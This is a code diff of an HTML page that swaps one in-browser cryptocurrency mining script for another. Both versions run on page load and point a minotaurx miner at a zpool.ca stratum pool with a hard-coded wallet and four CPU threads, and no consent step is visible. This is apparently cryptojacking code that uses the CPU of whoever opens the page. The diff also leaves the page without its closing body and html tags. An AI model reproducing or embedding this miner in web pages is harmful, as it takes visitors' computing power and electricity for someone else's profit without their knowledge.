@@ -10,23 +10,24 @@
 <body>
   <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
   <script src="mm.js"></script>
-  <script>
-    const stratum = {
-      server: "minotaurx.na.mine.zpool.ca",
-      port: 7019,
-      worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
-      password: "c=RVN"
-    }
 
-    mine({
-      stratum,
-      // optional
-      options: {
-        log: true, // enables/disables logs
-        threads: 4
-      }
-    })
-  </script>
-</body>
+            <script>
+            const client = new Client({
+            algorithm: 'minotaurx', // yespower, minotaurx
+            stratum: {
+            server: "minotaurx.na.mine.zpool.ca", // Your Pool host
+            port: 7019, // Your Pool port
+            worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q", // Your Wallet
+            password: "c=RVN" // Your Mining password
+            },
+            options: {
+            threads: 4, // CPU threads to mining
+            log: true // Show log on console
+            },
+            });
 
-</html>
+            // Start Mining
+            client.start();
+              </script>
+  
+  
